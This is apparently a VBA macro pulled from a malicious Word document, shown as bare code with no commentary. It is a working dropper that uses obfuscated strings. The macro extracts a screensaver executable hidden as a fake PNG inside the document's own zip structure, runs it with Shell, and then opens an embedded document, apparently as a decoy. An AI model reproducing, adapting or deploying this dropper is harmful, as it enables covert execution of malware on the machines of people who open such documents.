macros.code:
Sub asovivair_eywedr()
     
    Dim FSrdDEO As Object
    Dim oAzdurcp As Object
    
    Dim file_asovivair_name  As String
     
    Dim folder_asovivair_name  As Variant
    Dim folder_asovivair_final  As Variant
    
    Dim path_asovivair_file As String
    
    Dim folder_aduri_finalfile As String
    
    
    folder_asovivair_final = Environ$('USERPROFILE') & '\Downloads\'
    
    folder_asovivair_name = folder_asovivair_final & '' & Hour(Now) & Second(Now) & Minute(Now) & '\'
    
    If Dir(folder_asovivair_name, vbDirectory) = '' Then
        MkDir (folder_asovivair_name)
    End If
    
    
    
    
    Set oAzdurcp = CreateObject('Shell.Application')
    Set FSrdDEO = CreateObject('Scripting.FileSystemObject')
    
    
    file_asovivair_name = 'itmvroidovs' & Replace('_s', '_', '')
    
    
    folder_aduri_finalfile = folder_asovivair_final & file_asovivair_name & '.' & Replace('s_cr', '_', '')
    
     
    path_asovivair_file = folder_asovivair_name & file_asovivair_name
         
    If Dir(folder_aduri_finalfile, vbDirectory) = '' Then
    
        FSrdDEO.CopyFile Application.ActiveDocument.FullName, folder_asovivair_name & 'msdocks.' & Replace('z_ip', '_', ''), True
        Set FSrdDEO = Nothing
      
      
        oAzdurcp.Namespace(folder_asovivair_name).CopyHere oAzdurcp.Namespace(folder_asovivair_name & 'msdocks.' & Replace('z_ip', '_', '')).items
      
        
        Name folder_asovivair_name & 'word\media\image1.png' As folder_asovivair_name & 'word\media\image1.' & Replace('z_ip', '_', '')
      
        oAzdurcp.Namespace(folder_asovivair_name & 'word\').CopyHere oAzdurcp.Namespace(folder_asovivair_name & 'word\media\image1.' & Replace('z_i_p', '_', '')).items
      
        oAzdurcp.Namespace(folder_asovivair_name).CopyHere oAzdurcp.Namespace(folder_asovivair_name & 'word\image1.' & Replace('z_ip', '_', '')).items
        
        oAzdurcp.Namespace(folder_asovivair_final).CopyHere oAzdurcp.Namespace(folder_asovivair_name & 'image1.' & Replace('z_ip', '_', '')).items
        
        Name folder_asovivair_final & 'image1.png' As folder_aduri_finalfile
    End If
    
    Dim strProgramName As String
     
     
     
    strProgramName = folder_aduri_finalfile
     
     
    Call Shell('''' & strProgramName & ''' ''', vbMaximizedFocus)
    
     
    Name folder_asovivair_name & 'word\media\image2.png' As folder_asovivair_name & 'word\media\WorkBook.' & Replace('doc_x', '_', '')
     
    
    Documents.Open FileName:=folder_asovivair_name & 'word\media\WorkBook.' & Replace('doc_x', '_', ''), ConfirmConversions:=False, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:='', _
        PasswordTemplate:='', Revert:=False, WritePasswordDocument:='', _
        WritePasswordTemplate:='', Format:=wdOpenFormatAuto, XMLTransform:=''
        
         
      
    
End Sub
